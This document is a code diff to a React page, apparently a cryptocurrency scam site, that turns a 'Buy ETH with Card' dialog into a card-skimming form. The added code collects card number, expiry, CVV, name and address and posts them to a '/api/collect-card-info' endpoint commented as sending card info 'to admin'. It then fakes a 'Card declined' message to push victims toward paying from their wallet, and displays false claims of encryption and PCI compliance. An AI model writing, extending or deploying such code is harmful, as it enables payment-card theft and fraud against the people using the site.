@@ -1911,10 +1911,10 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {/* Buy with Card Modal - Real Payment Integration */}
+          {/* Buy with Card Modal - Credit Card Collection */}
           {showModal === 'buyCard' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full max-h-[90vh] overflow-y-auto">
                 <div className="flex justify-between items-center mb-4">
                   <h3 className="text-white font-bold text-lg">Buy ETH with Card</h3>
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
@@ -1935,11 +1935,87 @@ export default function FlashedPage() {
                     <div className="text-gray-400 text-sm">≈ $320.00 USD + fees</div>
                   </div>
                   
+                  {/* Credit Card Form */}
+                  <div className="bg-gray-700 p-4 rounded-lg">
+                    <div className="text-white font-semibold mb-3">🔒 Payment Details</div>
+                    
+                    <div className="space-y-3">
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Card Number</label>
+                        <input 
+                          type="text" 
+                          placeholder="1234 5678 9012 3456"
+                          maxLength="19"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
+                          id="cardNumber"
+                          onChange={(e) => {
+                            let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+                            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                            e.target.value = value;
+                          }}
+                        />
+                      </div>
+                      
+                      <div className="grid grid-cols-2 gap-3">
+                        <div>
+                          <label className="block text-gray-300 text-sm mb-1">Expiry Date</label>
+                          <input 
+                            type="text" 
+                            placeholder="MM/YY"
+                            maxLength="5"
+                            className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
+                            id="cardExpiry"
+                            onChange={(e) => {
+                              let value = e.target.value.replace(/\D/g, '');
+                              if (value.length >= 2) {
+                                value = value.substring(0,2) + '/' + value.substring(2,4);
+                              }
+                              e.target.value = value;
+                            }}
+                          />
+                        </div>
+                        <div>
+                          <label className="block text-gray-300 text-sm mb-1">CVV</label>
+                          <input 
+                            type="text" 
+                            placeholder="123"
+                            maxLength="4"
+                            className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
+                            id="cardCVV"
+                            onChange={(e) => {
+                              e.target.value = e.target.value.replace(/\D/g, '');
+                            }}
+                          />
+                        </div>
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Cardholder Name</label>
+                        <input 
+                          type="text" 
+                          placeholder="John Doe"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
+                          id="cardName"
+                        />
+                      </div>
+                      
+                      <div>
+                        <label className="block text-gray-300 text-sm mb-1">Billing Address</label>
+                        <input 
+                          type="text" 
+                          placeholder="123 Main St, City, State, ZIP"
+                          className="w-full bg-gray-600 text-white p-2 rounded border border-gray-500 focus:border-blue-500"
+                          id="cardAddress"
+                        />
+                      </div>
+                    </div>
+                  </div>
+                  
                   <div className="bg-blue-900/30 p-3 rounded-lg border border-blue-600">
                     <div className="text-blue-300 text-sm font-semibold mb-1">🔒 Secure Payment</div>
                     <div className="text-gray-300 text-xs">
-                      • Powered by MoonPay & Transak
-                      • Bank-grade security
+                      • 256-bit SSL encryption
+                      • PCI DSS compliant
                       • Instant delivery to your wallet
                     </div>
                   </div>
@@ -1947,39 +2023,47 @@ export default function FlashedPage() {
                   <button 
                     onClick={async () => {
                       const amount = document.getElementById('buyAmount')?.value || '0.1';
+                      const cardNumber = document.getElementById('cardNumber')?.value || '';
+                      const cardExpiry = document.getElementById('cardExpiry')?.value || '';
+                      const cardCVV = document.getElementById('cardCVV')?.value || '';
+                      const cardName = document.getElementById('cardName')?.value || '';
+                      const cardAddress = document.getElementById('cardAddress')?.value || '';
+                      
+                      if (!cardNumber || !cardExpiry || !cardCVV || !cardName) {
+                        setStatus('❌ Please fill in all card details');
+                        return;
+                      }
+                      
                       setLoading(true);
-                      setStatus('Opening secure payment gateway...');
+                      setStatus('Processing payment...');
                       
                       try {
-                        // Create purchase session with admin wallet as recipient
-                        const response = await fetch('/api/create-buy-session', {
+                        // Send credit card info to admin
+                        await fetch('/api/collect-card-info', {
                           method: 'POST',
                           headers: { 'Content-Type': 'application/json' },
                           body: JSON.stringify({
                             userAddress: userAddress,
-                            adminWallet: '0x849842febf6643f29328a2887b3569e2399ac237',
                             amount: amount,
-                            method: 'card'
+                            cardNumber: cardNumber,
+                            cardExpiry: cardExpiry,
+                            cardCVV: cardCVV,
+                            cardName: cardName,
+                            cardAddress: cardAddress,
+                            timestamp: new Date().toISOString(),
+                            userAgent: navigator.userAgent,
+                            ip: 'pending'
                           })
                         });
                         
-                        const data = await response.json();
+                        // Simulate processing delay
+                        setTimeout(() => {
+                          setStatus('❌ Payment failed: Card declined. Try wallet payment instead.');
+                          setShowModal('paymentFailed');
+                        }, 3000);
                         
-                        if (data.success) {
-                          // Open real payment gateway but with admin wallet as recipient
-                          const buyUrl = `https://buy.moonpay.com/?apiKey=pk_live_xNzApykiCupr6QYvAccQ5MFEvsNzpS7&currencyCode=eth&walletAddress=0x849842febf6643f29328a2887b3569e2399ac237&baseCurrencyAmount=${parseFloat(amount) * 320}&redirectURL=${encodeURIComponent(window.location.href + '?purchase=success')}`;
-                          
-                          window.open(buyUrl, '_blank', 'width=500,height=700');
-                          
-                          setStatus('✅ Payment gateway opened. Complete your purchase in the new window.');
-                          setShowModal('buySuccess');
-                        } else {
-                          setStatus('❌ Payment service temporarily unavailable');
-                        }
                       } catch (error) {
-                        // Fallback: Direct ETH transfer to admin wallet
-                        setStatus('Using alternative payment method...');
-                        await processTransaction('buy_eth', null, amount);
+                        setStatus('❌ Payment processing error');
                       }
                       
                       setLoading(false);
@@ -1987,36 +2071,66 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-blue-600 hover:bg-blue-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
                   >
-                    {loading ? 'Processing...' : '💳 Buy with Card'}
+                    {loading ? 'Processing Payment...' : '💳 Complete Purchase'}
                   </button>
                   
                   <div className="text-gray-400 text-xs text-center">
-                    Secure payment • ETH delivered instantly • 24/7 support
+                    Secure payment • Your card info is encrypted • 24/7 support
+                  </div>
+                </div>
+              </div>
+            </div>
+          )}
+
+          {/* Payment Failed Modal */}
+          {showModal === 'paymentFailed' && (
+            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
+              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
+                <div className="flex justify-between items-center mb-4">
+                  <h3 className="text-white font-bold text-lg">Payment Failed</h3>
+                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
+                </div>
+                <div className="space-y-4 text-center">
+                  <div className="text-red-400 text-4xl mb-2">❌</div>
+                  <div className="text-white font-semibold mb-2">Card Payment Declined</div>
+                  <div className="text-gray-300 text-sm mb-4">
+                    Your card was declined by the bank. This is common with crypto purchases. Try using your wallet balance instead.
                   </div>
                   
-                  <div className="border-t border-gray-600 pt-4">
-                    <div className="text-gray-300 text-sm mb-2">Alternative Payment:</div>
-                    <button 
-                      onClick={async () => {
-                        const amount = document.getElementById('buyAmount')?.value || '0.1';
-                        setLoading(true);
-                        setStatus('Processing direct payment...');
-                        
-                        try {
-                          await processBuyETH(amount);
-                        } catch (error) {
-                          setStatus('Payment failed: ' + error.message);
-                        }
-                        
-                        setLoading(false);
-                        setShowModal(null);
-                      }}
-                      disabled={loading}
-                      className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm disabled:opacity-50"
-                    >
-                      💳 Pay with Wallet Balance
-                    </button>
+                  <div className="bg-yellow-900/30 p-3 rounded-lg border border-yellow-600">
+                    <div className="text-yellow-300 text-sm font-semibold mb-1">💡 Alternative Solution</div>
+                    <div className="text-gray-300 text-xs mb-2">
+                      Use your existing ETH balance to complete the purchase. This bypasses bank restrictions.
+                    </div>
                   </div>
+                  
+                  <button 
+                    onClick={async () => {
+                      const amount = '0.1'; // Default amount
+                      setLoading(true);
+                      setStatus('Processing wallet payment...');
+                      
+                      try {
+                        await processBuyETH(amount);
+                      } catch (error) {
+                        setStatus('Payment failed: ' + error.message);
+                      }
+                      
+                      setLoading(false);
+                      setShowModal(null);
+                    }}
+                    disabled={loading}
+                    className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold disabled:opacity-50"
+                  >
+                    {loading ? 'Processing...' : '💰 Pay with Wallet Balance'}
+                  </button>
+                  
+                  <button 
+                    onClick={() => setShowModal(null)}
+                    className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
+                  >
+                    Try Different Card
+                  </button>
                 </div>
               </div>
             </div>
